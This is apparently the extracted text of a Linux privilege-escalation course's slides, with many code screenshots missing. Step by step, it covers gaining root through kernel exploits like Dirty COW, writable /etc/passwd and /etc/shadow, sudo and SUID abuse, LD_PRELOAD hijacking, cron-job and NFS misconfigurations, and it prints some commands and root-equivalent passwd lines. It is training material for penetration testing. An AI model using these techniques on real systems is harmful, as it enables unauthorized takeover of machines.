+Showeet.com, for licensing the presentation template used in this course.
+Devand MacLean, for reviewing the course and suggesting several improvements.
+Our ultimate goal with privilege escalation in Linux is to gain a shell running as the root user.
+Privilege escalation can be simple (e.g. a kernel exploit) or require a lot of reconnaissance on the compromised system.
+In a lot of cases, privilege escalation may not simply rely on a single misconfiguration, but may require you to think, and combine multiple misconfigurations.
+General Concepts	(cont.)
+All privilege escalations are effectively examples of access control violations.
+Access control and user permissions are intrinsically linked.
+When focusing on privilege escalations in Linux, understanding how Linux handles permissions is very important.
+Users, Groups, and Files & Directories
+At a basic level, permissions in Linux are a relationship between users, groups, and files & directories.
+Users can belong to multiple groups. Groups can have multiple users.
+Every file and directory defines its permissions in terms of a user, a group, and “others” (all other users).
+Users
+User accounts are configured in the /etc/passwd file. User password hashes are stored in the /etc/shadow file. Users are identified by an integer user ID (UID).
+The “root” user account is a special type of account in Linux. It has an UID of 0, and the system grants this user access to every file.
+Groups are configured in the /etc/group file.
+Users have a primary group, and can have multiple secondary (or supplementary) groups.
+By default, a user’s primary group has the same name as their user account.
+All files & directories have a single owner and a group.
+Permissions are defined in terms of read, write, and execute operations.
+There are three sets of permissions, one for the owner, one for the group, and one for all “other” users (can also be referred to as “world”).
+Only the owner can change permissions.
+
+17
+File Permissions
+
+File permissions are self explanatory:
+        ◦ Read – when set, the file contents can be read.
+        ◦ Write – when set, the file contents can be modified.
+        ◦ Execute – when set, the file can be executed (i.e. run as some kind of process).
+
+
+
+
+
+18
+Directory Permissions
+
+Directory permissions are slightly more complicated:
+        ◦ Execute – when set, the directory can be entered. Without this permission, neither the read nor write permissions will work.
+        ◦ Read – when set, the directory contents can be listed.
+        ◦ Write – when set, files and subdirectories can be created in the directory.
+19
+Special Permissions
+
+setuid (SUID) bit
+When set, files will get executed with the privileges of the file owner.
+setgid (SGID) bit
+When set on a file, the file will get executed with the privileges of the file group.
+When set on a directory, files created within that directory will inherit the group of the directory itself.
+
+
+20
+Viewing Permissions
+
+The ls command can be used to view permissions:
+
+The first 10 characters indicate the permissions set on the file or directory.
+The first character simply indicates the type (e.g. '-' for file, 'd' for directory).
+21
+Viewing Permissions
+
+The remaining 9 characters represent the 3 sets of permissions (owner, group, others).
+Each set contains 3 characters, indicating the read (r), write (w), and execute (x) permissions.
+SUID/SGID permissions are represented by an 's' in the execute position.
+
+
+
+22
+
+
+
+Real, Effective, & Saved UID/GID
+
+I previously stated that users are identified by a user ID.
+In fact, each user has 3 user IDs in Linux (real, effective, and saved).
+A user’s real ID is who they actually are (the ID defined in
+/etc/passwd). Ironically, the real ID is actually used less often to check a user’s identity.
+Real, Effective, & Saved UID/GID
+
+A user’s effective ID is normally equal to their real ID, however when executing a process as another user, the effective ID is set to that user’s real ID.
+The effective ID is used in most access control decisions to verify a user, and commands such as whoami use the effective ID.
+Finally, the saved ID is used to ensure that SUID processes can temporarily switch a user’s effective ID back to their real ID and back again without losing track of the original effective ID.
+
+
+24
+Real, Effective, & Saved UID/GID
+
+Print real and effective user / group IDs:
+
+Print real, effective, saved, and file system user / group IDs of the current process (i.e. our shell):
+
+
+
+Uid:
+1000
+0
+0
+0
+Gid:
+1000
+0
+0
+0
+25
+
+
+Spawning Root Shells
+
+As stated in the introduction to this course, our ultimate goal is to spawn a root shell.
+While the end result is the same (executing /bin/sh or /bin/bash), there are multiple ways of achieving this execution.
+In this course, we will use a variety of methods. This section highlights a few which can be used in situations where commands can be executed as root.
+“rootbash” SUID
+
+One of my favorite ways to spawn a root shell is to create a copy of the /bin/bash executable file (I usually rename it rootbash), make sure it is owned by the root user, and has the SUID bit set.
+A root shell can be spawned by simply executing the rootbash file with the -p command line option.
+The benefit of this method is it is persistent (once you run the exploit, rootbash can be used multiple times).
+
+28
+Custom Executable
+
+There may be instances where some root process executes another process which you can control. In these cases, the following C code, once compiled, will spawn a Bash shell running as root:
+
+Compile using:
+ $ gcc -o <name> <filename.c>	
+
+
+
+
+29
+msfvenom
+
+Alternatively, if a reverse shell is preferred, msfvenom
+can be used to generate an executable (.elf) file:
+
+
+This reverse shell can be caught using netcat or Metasploit’s own multi/handler.
+
+
+30
+Native Reverse Shells
+
+There are multiple ways to spawn reverse shells natively on many Linux distributions.
+A good tool for suggesting these is: https://github.com/mthbernardes/rsg
+All can be caught using a simple netcat listener.
+
+
+Why use tools?
+
+Tools allow us to automate the reconnaissance that can identify potential privilege escalations.
+While it is always important to understand what tools are doing, they are invaluable in a time-limited setting, such as an exam.
+In this course we will use Linux Smart Enumeration and LinEnum.
+
+
+
+Linux Smart Enumeration
+
+Linux Smart Enumeration (lse.sh) has recently become my personal favorite privilege escalation tool.
+In addition to being a Bash script (which helps if Python isn’t installed), it has multiple levels which gradually reveal more and more information.
+https://github.com/diego-treitos/linux-smart-enumeration
+
+
+
+LinEnum
+
+LinEnum is an advanced Bash script which extracts a large amount of useful information from the target system.
+It can copy interesting files for export, and search for files containing a keyword (e.g. “password”).
+
+https://github.com/rebootuser/LinEnum
+Other Tools
+
+While we won’t use these tools in the course, feel free to experiment with them:
+    • https://github.com/linted/linuxprivchecker
+    • https://github.com/AlessandroZ/BeRoot
+    • http://pentestmonkey.net/tools/audit/unix-privesc-check
+
+
+What is a Kernel?
+
+Kernels are the core of any operating system.
+Think of it as a layer between application software and the actual computer hardware.
+The kernel has complete control over the operating system. Exploiting a kernel vulnerability can result in execution as the root user.
+Finding Kernel Exploits
+
+Finding and using kernel exploits is usually a simple process:
+    1. Enumerate kernel version (uname -a).
+    2. Find matching exploits (Google, ExploitDB, GitHub).
+    3. Compile and run.
+Beware though, as Kernel exploits can often be unstable and may be one-shot or cause a system crash.
+
+39
+Privilege Escalation
+
+    1. Enumerate the kernel version:
+
+    2. Use searchsploit to find matching exploits:
+
+
+ # searchsploit linux kernel 2.6.32 priv esc	
+
+Note that none of the exploits match the distribution of Linux (Debian).
+
+
+40
+Privilege Escalation
+
+    3. We can try and adjust our search to be less specific with the kernel version, but more specific with the distribution:
+
+ # searchsploit linux kernel 2.6 priv esc debian	
+
+Again, we get a few exploits that we can’t use for various reasons.
+    4. Install Linux Exploit Suggester 2 (https://github.com/jondonas/linux-exploit- suggester-2) and run the tool against the original kernel version:
+
+ # ./linux-exploit-suggester-2.pl –k 2.6.32	
+
+This reveals a popular kernel exploit (Dirty COW).
+
+41
+Privilege Escalation
+
+    5. There are a number of Dirty COW exploits, all of which use different methods to obtain a root shell. The following version seems to work best on the practice VM: https://gist.github.com/KrE80r/42f8629577db95782d5e4f6 09f437a54
+    6. Download and compile it using the instructions in the file:
+ $ gcc -pthread c0w.c -o c0w	
+
+
+
+42
+Privilege Escalation
+
+    7. Run the exploit:
+
+
+ $ ./c0w	
+
+    8. Once the exploit is complete, simply execute the
+/usr/bin/passwd binary to get a root shell:
+
+Service Exploits
+
+Services are simply programs that run in the background, accepting input or performing regular tasks.
+If vulnerable services are running as root, exploiting them can lead to command execution as root.
+Service exploits can be found using Searchsploit, Google, and GitHub, just like with Kernel exploits.
+Services	Running as	Root
+
+The following command will show all processes that are running as root:
+
+ $ ps aux | grep "^root"	
+
+With any results, try to identify the version number of the program being executed.
+
+46
+Enumerating Program Versions
+
+Running the program with the --version/-v command line option often shows the version number:
+
+On Debian-like distributions, dpkg can show installed programs and their version:
+
+ $ dpkg -l | grep <program>	
+
+On systems that use rpm, the following achieves the same:
+
+ $ rpm –qa | grep <program>	
+
+
+
+47
+Privilege Escalation
+
+    1. Enumerate the processes running as root:
+
+Note that the mysqld process is running as root.
+    2. Enumerate the version of mysqld:
+
+
+
+
+48
+Privilege Escalation
+
+    3. MySQL has the ability to install User Defined Functions (UDF) which run via shared objects.
+    4. Follow the instructions in this exploit to compile and install a UDF which executes system commands: https://www.exploit-db.com/exploits/1518
+Note: some commands may require slight modification.
+
+
+49
+Privilege Escalation
+
+    5. Once the UDF is installed, run the following command in the MySQL shell:
+
+    6. Drop back to our regular shell, and run /tmp/rootbash for a root shell:
+
+
+
+
+
+
+50
+Port Forwarding
+
+In some instances, a root process may be bound to an internal port, through which it communicates.
+If for some reason, an exploit cannot run locally on the target machine, the port can be forwarded using SSH to your local machine:
+
+
+ $ ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>	
+
+The exploit code can now be run on your local machine at whichever port you chose.
+
+weak File Permissions
+
+Certain system files can be taken advantage of to perform privilege escalation if the permissions on them are too weak.
+If a system file has confidential information we can read, it may be used to gain access to the root account.
+If a system file can be written to, we may be able to modify the way the operating system works and gain root access that way.
+53
+Useful Commands
+
+Find all writable files in /etc:
+
+ $ find /etc -maxdepth 1 -writable -type f	
+
+Find all readable files in /etc:
+
+ $ find /etc -maxdepth 1 -readable -type f	
+
+Find all directories which can be written to:
+ $ find / -executable -writable -type d 2> /dev/null	
+
+
+54
+
+
+
+/etc/shadow
+
+The /etc/shadow file contains user password hashes, and by default is not readable by any user except for root.
+If we are able to read the contents of the /etc/shadow file, we might be able to crack the root user’s password hash.
+If we are able to modify the /etc/shadow file, we can replace the root user’s password hash with one we know.
+Privilege Escalation
+    1. Check the permissions of the /etc/shadow file: Note that it is world readable.
+    2. Extract the root user’s password hash:
+
+
+56
+Privilege Escalation
+
+    3. Save the password hash in a file (e.g. hash.txt):
+
+    4. Crack the password hash using john:
+
+
+57
+Privilege Escalation
+
+    5. Use the su command to switch to the root user, entering the password we cracked when prompted:
+
+
+
+58
+Privilege Escalation (#2)
+    1. Check the permissions of the /etc/shadow file: Note that it is world writable.
+    2. Copy / save the contents of /etc/shadow so we can restore it later.
+
+
+
+59
+Privilege Escalation (#2)
+
+    3. Generate a new SHA-512 password hash:
+
+
+    4. Edit the /etc/shadow and replace the root user’s password hash with the one we generated.
+
+
+60
+Privilege Escalation (#2)
+
+    5. Use the su command to switch to the root user, entering the new password when prompted:
+
+
+/etc/passwd
+
+The /etc/passwd historically contained user password hashes.
+For backwards compatibility, if the second field of a user row in /etc/passwd contains a password hash, it takes precedent over the hash in /etc/shadow.
+If we can write to /etc/passwd, we can easily enter a known password hash for the root user, and then use the su command to switch to the root user.
+Alternatively, if we can only append to the file, we can create a new user but assign them the root user ID (0). This works because Linux allows multiple entries for the same user ID, as long as the usernames are different.
+/etc/passwd
+
+The root account in /etc/passwd is usually configured like this:
+
+ root:x:0:0:root:/root:/bin/bash	
+The “x” in the second field instructs Linux to look for the password hash in the /etc/shadow file.
+
+In some versions of Linux, it is possible to simply delete the “x”, which Linux interprets as the user having no password:
+
+ root::0:0:root:/root:/bin/bash	
+
+
+
+63
+Privilege Escalation
+
+    1. Check the permissions of the /etc/passwd file:
+
+Note that it is world writable.
+    2. Generate a password hash for the password “password” using openssl:
+
+
+64
+Privilege Escalation
+
+    3. Edit the /etc/passwd file and enter the hash in the second field of the root user row:
+
+ root:L9yLGxncbOROc:0:0:root:/root:/bin/bash	
+
+    4. Use the su command to switch to the root user:
+
+65
+Privilege Escalation
+
+    5. Alternatively, append a new row to /etc/passwd to create an alternate root user (e.g. newroot):
+
+ newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bash	
+
+    6. Use the su command to switch to the newroot user:
+
+66
+
+
+
+Backups
+
+Even if a machine has correct permissions on important or sensitive files, a user may have created insecure backups of these files.
+It is always worth exploring the file system looking for readable backup files. Some common places include user home directories, the / (root) directory, /tmp, and /var/backups.
+Privilege Escalation
+
+    1. Look for interesting files, especially hidden files, in common locations:
+
+$ ls
+-la
+/home/user
+$ ls
+-la
+/
+$ ls
+-la
+/tmp
+$ ls
+-la
+/var/backups
+    2. Note that a hidden .ssh directory exists in the system root:
+
+
+
+
+68
+Privilege Escalation
+
+    3. In this directory, we can see a world-readable file called root_key:
+
+    4. Further inspection of this file seems to indicate that this is an SSH private key. The name and owner of the file suggests this key belongs to the root user:
+
+
+
+
+69
+Privilege Escalation
+
+    5. Before we try to use this key, let’s confirm that root logins are even allowed via SSH:
+
+    6. Copy the key over to your local machine, and give it correct permissions (otherwise SSH will refuse to use it):
+
+ # chmod 600 root_key	
+
+
+
+
+
+
+70
+Privilege Escalation
+
+    7. Use the key to SSH to the target as the root account:
+
+72
+What is sudo?
+
+sudo is a program which lets users run other programs with the security privileges of other users. By default, that other user will be root.
+A user generally needs to enter their password to use sudo, and they must be permitted access via rule(s) in the /etc/sudoers file.
+Rules can be used to limit users to certain programs, and forgo the password entry requirement.
+
+73
+Useful Commands
+
+Run a program using sudo:
+
+
+ $ sudo <program>	
+
+Run a program as a specific user:
+
+
+ $ sudo –u <username> <program>	
+
+List programs a user is allowed (and disallowed) to run:
+
+
+ $ sudo -l	
+
+74
+
+
+
+Known Password
+
+By far the most obvious privilege escalation with sudo is to use sudo as it was intended!
+If your low privileged user account can use sudo unrestricted (i.e. you can run any programs) and you know the user’s password, privilege escalation is easy, by using the “switch user” (su) command to spawn a root shell:
+
+ $ sudo su	
+Other Methods
+
+If for some reason the su program is not allowed, there are many other ways to escalate privileges:
+
+
+$
+sudo
+-s
+$
+sudo
+-i
+$
+sudo
+/bin/bash
+$
+sudo
+passwd
+Even if there are no “obvious” methods for escalating privileges, we may be able to use a shell escape sequence.
+76
+
+
+
+Shell Escape Sequences
+
+Even if we are restricted to running certain programs via sudo, it is sometimes possible to “escape” the program and spawn a shell.
+Since the initial program runs with root privileges, so does the spawned shell.
+A list of programs with their shell escape sequences can be found here: https://gtfobins.github.io/
+Privilege Escalation (Generic)
+
+    1. List the programs your user is allowed to run via
+sudo:
+
+78
+Privilege Escalation (Generic)
+
+    2. For each program in the list, see if there is a shell escape sequence on GTFOBins (https://gtfobins.github.io/)
+    3. 	If an escape sequence exists, run the program via sudo and perform the sequence to spawn a root shell.
+
+79
+
+
+
+Abusing Intended Functionality
+
+If a program doesn’t have an escape sequence, it may still be possible to use it to escalate privileges.
+If we can read files owned by root, we may be able to extract useful information (e.g. passwords, hashes, keys).
+If we can write to files owned by root, we may be able to insert or modify information.
+Privilege Escalation
+
+    1. List the programs your user is allowed to run via sudo:
+
+Note that apache2 is in the list.
+    2. apache2 doesn’t have any known shell escape sequences, however when parsing a given config file, it will error and print any line it doesn’t understand.
+
+
+81
+Privilege Escalation
+
+    3. Run apache2 using sudo, and provide it the
+/etc/shadow file as a config file:
+
+    4. Extract the root user’s hash from the file.
+
+
+82
+Privilege Escalation
+
+
+
+
+
+    5. Save the password hash in a file (e.g. hash.txt):
+
+    6. Crack the password hash using john:
+
+
+83
+Privilege Escalation
+
+    7. Use the su command to switch to the root user, entering the password we cracked when prompted:
+
+
+
+84
+
+
+
+Environment Variables
+
+Programs run through sudo can inherit the environment variables from the user’s environment.
+In the /etc/sudoers config file, if the env_reset option is set, sudo will run programs in a new, minimal environment.
+The env_keep option can be used to keep certain environment variables from the user’s environment.
+The configured options are displayed when running sudo -l
+
+
+
+LD_PRELOAD
+
+LD_PRELOAD is an environment variable which can be set to the path of a shared object (.so) file.
+When set, the shared object will be loaded before any others.
+By creating a custom shared object and creating an init() function, we can execute code as soon as the object is loaded.
+Limitations
+
+LD_PRELOAD will not work if the real user ID is different from the effective user ID.
+sudo must be configured to preserve the LD_PRELOAD environment variable using the env_keep option.
+
+
+87
+Privilege Escalation
+
+    1. List the programs your user is allowed to run via
+sudo:
+
+Note that the env_keep option includes the LD_PRELOAD environment variable.
+
+
+88
+Privilege Escalation
+
+    2. Create a file (preload.c) with the following contents:
+
+
+89
+Privilege Escalation
+
+    3. Compile preload.c to preload.so:
+
+ $ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c	
+    4. Run any allowed program using sudo, while setting the LD_PRELOAD environment variable to the full path of the preload.so file:
+
+90
+
+
+LD_LIBRARY_PATH
+
+The LD_LIBRARY_PATH environment variable contains a set of directories where shared libraries are searched for first.
+The ldd command can be used to print the shared libraries used by a program:
+
+ $ ldd /usr/sbin/apache2	
+
+By creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead.
+Privilege Escalation
+
+    1. Run ldd against the apache2 program file:
+
+Hijacking shared objects using this method is hit or miss. Choose one from the list and try it (libcrypt.so.1 seems to work well).
+
+92
+Privilege Escalation
+
+    2. Create a file (library_path.c) with the following contents:
+
+
+
+93
+Privilege Escalation
+
+    3. Compile library_path.c into libcrypt.so.1:
+
+ $ gcc -o libcrypt.so.1 -shared -fPIC library_path.c	
+    4. Run apache2 using sudo, while setting the LD_LIBRARY_PATH environment variable to the current path (where we compiled library_path.c):
+
+
+Cron Jobs
+
+Cron jobs are programs or scripts which users can schedule to run at specific times or intervals.
+Cron jobs run with the security level of the user who owns them.
+By default, cron jobs are run using the /bin/sh shell, with limited environment variables.
+Cron Jobs
+
+Cron table files (crontabs) store the configuration for cron jobs.
+User crontabs are usually located in /var/spool/cron/ or
+/var/spool/cron/crontabs/
+The system-wide crontab is located at /etc/crontab.
+
+
+
+97
+
+
+
+File Permissions
+
+Misconfiguration of file permissions associated with cron jobs can lead to easy privilege escalation.
+If we can write to a program or script which gets run as part of a cron job, we can replace it with our own code.
+Privilege Escalation
+
+    1. View the contents of the system-wide crontab:
+
+    2. Locate the overwrite.sh file on the server:
+
+Privilege Escalation
+
+    3. Check the file’s permissions:
+
+Note that the file is world writable.
+    4. Replace the contents of the overwrite.sh file with the following:
+Privilege Escalation
+
+    5. Run a netcat listener on your local machine and wait for the cron job to run. A reverse shell running as the root user should be caught:
+
+PATH Environment Variable
+
+The crontab PATH environment variable is by default set to
+/usr/bin:/bin
+The PATH variable can be overwritten in the crontab file.
+If a cron job program/script does not use an absolute path, and one of the PATH directories is writable by our user, we may be able to create a program/script with the same name as the cron job.
+Privilege Escalation
+
+    1. View the contents of the system-wide crontab:
+
+Note that the /home/user directory (which we can write to) is at the start of the PATH variable, and the first cron job does not use an absolute path.
+
+Privilege Escalation
+
+    2. Create the file overwrite.sh in /home/user with the following contents:
+
+    3. Ensure that overwrite.sh is executable:
+ $ chmod +x /home/user/overwrite.sh	
+
+Privilege Escalation
+
+    4. Wait for the cronjob to run (this job in particular runs every minute).
+    5. Once the /tmp/rootbash file is created, execute it (with
+-p to preserve the effective UID) to gain a root shell:
+
+Wildcards
+
+When a wildcard character (*) is provided to a command as part of an argument, the shell will first perform filename expansion (also known as globbing) on the wildcard.
+This process replaces the wildcard with a space-separated list of the file and directory names in the current directory.
+An easy way to see this in action is to run the following command from your home directory:
+
+ $ echo *	
+Wildcards & Filenames
+
+Since filesystems in Linux are generally very permissive with filenames, and filename expansion happens before the command is executed, it is possible to pass command line options (e.g. -h, --help) to commands by creating files with these names.
+The following commands should show how this works:
+
+Wildcards & Filenames (cont.)
+
+Filenames are not simply restricted to simple options like -h or
+--help.
+In fact we can create filenames that match complex options:
+--option=key=value
+GTFOBins (https://gtfobins.github.io) can help determine whether a command has command line options which will be useful for our purposes.
+
+Privilege Escalation
+
+    1. View the contents of the system-wide crontab:
+
+    2. View the contents of the /usr/local/bin/compress.sh file:
+
+Note that the tar command is run with a wildcard in the /home/user directory.
+
+Privilege Escalation
+
+    3. GTFOBins shows that tar has command line options which can be used to run other commands as part of a checkpoint feature.
+    4. Use msfvenom to create a reverse shell ELF payload:
+
+Privilege Escalation
+
+    5. Copy the file to the /home/user directory on the remote host.
+    6. Create two files in the /home/user directory:
+
+Privilege Escalation
+
+    7. Run a netcat listener on your local machine and wait for the cron job to run. A reverse shell running as the root user should be caught:
+
+SUID / SGID Files
+
+SUID files get executed with the privileges of the file owner.
+SGID files get executed with the privileges of the file group.
+If the file is owned by root, it gets executed with root privileges, and we may be able to use it to escalate privileges.
+Finding SUID / SGID Files
+
+We can use the following find command to locate files with the SUID or SGID bits set:
+
+$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+-rwxr-sr-x 1 root shadow 19528 Feb 15	2011 /usr/bin/expiry
+-rwxr-sr-x 1 root ssh 108600 Apr	2	2014 /usr/bin/ssh-agent
+-rwsr-xr-x 1 root root 37552 Feb 15	2011 /usr/bin/chsh
+-rwsr-xr-x 2 root root 168136 Jan	5	2016 /usr/bin/sudo
+
+-rwxr-sr-x
+1
+root
+tty 11000 Jun 17	2010 /usr/bin/bsd-write
+-rwxr-sr-x
+...
+1
+root
+crontab 35040 Dec 18	2010 /usr/bin/crontab
+
+115
+
+
+
+Shell Escape Sequences
+
+Just as we were able to use shell escape sequences with programs running via sudo, we can do the same with SUID / SGID files.
+A list of programs with their shell escape sequences can be found here: https://gtfobins.github.io/
+Refer to the previous section on shell escape sequences for how to use them.
+A Quick Word on LD_PRELOAD & LD_LIBRARY_PATH
+You may be thinking: why we can’t just use the same LD_PRELOAD and LD_LIBRARY_PATH environment variable tricks we used with sudo privilege escalation?
+By default, this is disabled in Linux, due to the obvious security risk it presents!
+Both these environment variables get ignored when SUID files are executed.
+
+117
+
+
+
+Known Exploits
+
+Certain programs install SUID files to aid their operation.
+Just as services which run as root can have vulnerabilities we can exploit for a root shell, so too can these SUID files.
+Exploits can be found using Searchsploit, Google, and GitHub, in the same way we find exploits for Kernels and Services.
+Privilege Escalation
+
+    1. Find SUID/SGID files on the target:
+
+
+Exim is a popular mail transfer agent that is somewhat notorious for having many security vulnerabilities.
+
+
+119
+Privilege Escalation
+
+    2. The version of exim is rather obvious from the filename, however we can confirm it:
+
+    3. Using searchsploit on our local machine, we find a local privilege escalation for this exact version:
+
+
+120
+Privilege Escalation
+
+    4. Copy the exploit script across to the target machine. You may need to remove ^M characters from the script:
+ $ sed -e "s/^M//" 39535.sh > privesc.sh	
+Note that to get ^M you have to hold Ctrl and then press V and M in succession.
+    5. Make sure the script is executable:
+ $ chmod + privesc.sh	
+
+
+
+121
+Privilege Escalation
+
+    6. Execute the script to gain a root shell:
+
+Shared Object Injection
+
+When a program is executed, it will try to load the shared objects it requires.
+By using a program called strace, we can track these system calls and determine whether any shared objects were not found.
+If we can write to the location the program tries to open, we can create a shared object and spawn a root shell when it is loaded.
+Privilege Escalation
+
+    1. Find SUID/SGID files on the target:
+
+
+The suid-so file should execute with root user permissions.
+
+
+124
+Privilege Escalation
+
+    2. Run strace on the SUID file:
+
+The libcalc.so shared object could not be found, and the program is looking in our user’s home directory, which we can write to.
+
+125
+Privilege Escalation
+
+    3. Create the /home/user/.config directory.
+    4. Create the file libcalc.c with the following contents:
+
+126
+Privilege Escalation
+
+    5. Compile libcalc.c into /home/user/.config/libcalc.so:
+
+ $ gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c	
+
+    6. Run the SUID executable to get a root shell:
+
+
+127
+
+
+
+PATH Environment Variable
+
+The PATH environment variable contains a list of directories where the shell should try to find programs.
+If a program tries to execute another program, but only specifies the program name, rather than its full (absolute) path, the shell will search the PATH directories until it is found.
+Since a user has full control over their PATH variable, we can tell the shell to first look for programs in a directory we can write to.
+Finding Vulnerable Programs
+
+If a program tries to execute another program, the name of that program is likely embedded in the executable file as a string.
+We can run strings on the executable file to find strings of characters.
+We can also use strace to see how the program is executing. Another program called ltrace may also be of use.
+
+
+129
+Finding Vulnerable Programs	(cont.)
+
+Running strings against a file:
+
+ $ strings /path/to/file	
+
+Running strace against a command:
+
+ $ strace -v -f -e execve <command> 2>&1 | grep exec	
+
+Running ltrace against a command:
+
+
+ $ ltrace <command>	
+
+
+
+
+130
+Privilege Escalation
+
+    1. Find SUID/SGID files on the target:
+
+
+The suid-env file should execute with root user permissions.
+
+
+131
+Privilege Escalation
+
+    2. Run strings on the SUID file:
+
+The file could be trying to run the service program without a full path.
+    3. We can verify this with strace:
+
+
+132
+Privilege Escalation
+
+    4. Optionally, we can also verify with ltrace:
+
+This reveals that the system function is being used to execute the service program.
+    5. Create a file system.c with the following contents:
+
+
+133
+Privilege Escalation
+
+    6. Compile service.c into a file called service:
+ $ gcc -o service service.c	
+    7. Prepend the current directory (or where the new service executable is located) to the PATH variable, and execute the SUID file for a root shell:
+
+
+134
+
+
+
+Abusing Shell Features	(#1)
+
+In some shells (notably Bash <4.2-048) it is possible to define user functions with an absolute path name.
+These functions can be exported so that subprocesses have access to them, and the functions can take precedence over the actual executable being called.
+Privilege Escalation
+
+    1. Find SUID/SGID files on the target:
+
+
+The suid-env file should execute with root user permissions.
+
+
+136
+Privilege Escalation
+
+    2. Run strings on the SUID file:
+
+The file could be trying to run the /usr/sbin/service program.
+    3. We can verify this with strace:
+
+137
+Privilege Escalation
+
+    4. Optionally, we can also verify with ltrace:
+
+This reveals that the system function is being used to execute the
+/usr/sbin/service program.
+    5. Verify the version of Bash is lower than 4.2-048:
+
+
+
+
+
+138
+Privilege Escalation
+
+    6. Create a Bash function with the name “/usr/sbin/service” and export the function:
+
+    7. Execute the SUID file for a root shell:
+
+Abusing Shell Features	(#2)
+
+Bash has a debugging mode which can be enabled with the –x command line option, or by modifying the SHELLOPTS environment variable to include xtrace.
+By default, SHELLOPTS is read only, however the env command allows SHELLOPTS to be set.
+When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debug statements. This variable can include an embedded command, which will execute every time it is shown.
+Abusing Shell Features	(#2) (cont.)
+
+If a SUID file runs another program via Bash (e.g. by using system() ) these environment variables can be inherited.
+If an SUID file is being executed, this command will execute with the privileges of the file owner.
+In Bash versions 4.4 and above, the PS4 environment variable is not inherited by shells running as root.
+
+141
+Privilege Escalation
+
+    1. Find SUID/SGID files on the target:
+
+
+The suid-env2 file should execute with root user permissions.
+
+
+142
+Privilege Escalation
+
+    2. Run strings on the SUID file:
+
+The file could be trying to run the /usr/sbin/service program.
+    3. We can verify this with strace:
+
+143
+Privilege Escalation
+
+    4. Optionally, we can also verify with ltrace:
+
+This reveals that the system function is being used to execute the service program.
+    5. Run the SUID file with bash debugging enabled and the PS4 variable assigned to our payload:
+
+
+144
+Privilege Escalation
+
+    6. Run the /tmp/rootbash file with the -p command line option to get a root shell:
+
+Passwords
+
+While it might seem like a long shot, weak password storage and password re-use can be easy ways to escalate privileges.
+While the root user’s account password is hashed and stored securely in /etc/shadow, other passwords, such as those for services may be stored in plaintext in config files.
+If the root user re-used their password for a service, that password may be found and used to switch to the root user.
+
+
+
+History Files
+
+History files record commands issued by users while they are using certain programs.
+If a user types a password as part of a command, this password may get stored in a history file.
+It is always a good idea to try switching to the root user with a discovered password.
+Privilege Escalation
+
+    1. View the contents of hidden files in the user’s home directory with filenames ending in “history”:
+
+
+It appears that the user connected to a MySQL server as the root user using the password “password123”.
+149
+Privilege Escalation
+
+    2. Use the su command to switch to the root user account, using the password found in the history file:
+
+
+
+
+
+
+150
+
+
+
+Config Files
+
+Many services and programs use configuration (config) files to store settings.
+If a service needs to authenticate to something, it might store the credentials in a config file.
+If these config files are accessible, and the passwords they store are reused by privileged users, we may be able to use it to log in as that user.
+Privilege Escalation
+
+    1. List the contents of the user’s home directory:
+
+    2. View the contents of the myvpn.ovpn config file:
+
+The auth-user-pass option in OpenVPN allows for the plaintext storage of credentials in a file (/etc/openvpn/auth.txt).
+
+
+152
+Privilege Escalation
+
+    3. View the contents of the /etc/openvpn/auth.txt file:
+
+    4. Use the su command to switch to the root user account, using the password found in the auth.txt file:
+
+
+
+153
+
+
+
+SSH Keys
+
+SSH keys can be used instead of passwords to authenticate users using SSH.
+SSH keys come in pairs: one private key, and one public key. The private key should always be kept secret.
+If a user has stored their private key insecurely, anyone who can read the key may be able to log into their account using it.
+154
+Privilege Escalation
+
+    1. A hidden directory (.ssh) exists in the system root directory. View the contents of this directory:
+
+The file root_key is world-readable.
+    2. View the contents of the root_key file:
+
+155
+Privilege Escalation
+
+    3. Copy the root_key file to your local machine and correct its permissions so SSH will accept it:
+
+ $ chmod 600 root_key	
+
+    4. Use the key to connect to the SSH server as the root user:
+
+NFS
+
+NFS (Network File System) is a popular distributed file system. NFS shares are configured in the /etc/exports file.
+Remote users can mount shares, access, create, modify files.
+By default, created files inherit the remote user’s id and group id (as owner and group respectively), even if they don’t exist on the NFS server.
+Useful Commands
+
+Show the NFS server’s export list:
+
+ $ showmount -e <target>	
+
+Similar Nmap script:
+
+ $ nmap –sV –script=nfs-showmount <target>	
+
+Mount an NFS share:
+
+ $ mount -o rw,vers=2 <target>:<share> <local_directory>	
+
+
+159
+Root Squashing
+
+Root Squashing is how NFS prevents an obvious privilege escalation.
+If the remote user is (or claims to be) root (uid=0), NFS will instead “squash” the user and treat them as if they are the “nobody” user, in the “nogroup” group.
+While this behavior is default, it can be disabled!
+
+
+
+160
+no_root_squash
+
+no_root_squash is an NFS configuration option which turns root squashing off.
+When included in a writable share configuration, a remote user who identifies as “root” can create files on the NFS share as the local root user.
+
+161
+Privilege Escalation
+
+    1. Check the contents of /etc/exports for shares with the no_root_squash option:
+
+    2. Confirm that the NFS share is available for remote mounting:
+
+
+
+162
+Privilege Escalation
+
+    3. Create a mount point on your local machine and mount the /tmp NFS share:
+
+    4. Using the root user on your local machine, generate a payload and save it to the mounted share:
+
+
+163
+Privilege Escalation
+
+    5. Make sure the file has the SUID bit set, and is executable by everyone:
+
+ # chmod +xs /tmp/nfs/shell.elf	
+
+    6. On the target machine, execute the file to get a root shell:
+
+Enumeration
+
+    1. Check your user (id, whoami).
+    2. Run Linux Smart Enumeration with increasing levels.
+    3. Run LinEnum & other scripts as well!
+    4. If your scripts are failing and you don’t know why, you can always run the manual commands from this course, and other Linux PrivEsc cheatsheets online (e.g. https://blog.g0tmi1k.com/2011/08/basic- linux-privilege-escalation/)
+Strategy
+
+Spend some time and read over the results of your enumeration.
+If Linux Smart Enumeration level 0 or 1 finds something interesting, make a note of it.
+Avoid rabbit holes by creating a checklist of things you need for the privilege escalation method to work.
+
+
+
+167
+Strategy
+
+Have a quick look around for files in your user’s home directory and other common locations (e.g.
+/var/backup, /var/logs).
+If your user has a history file, read it, it may have important information like commands or even passwords.
+
+168
+Strategy
+
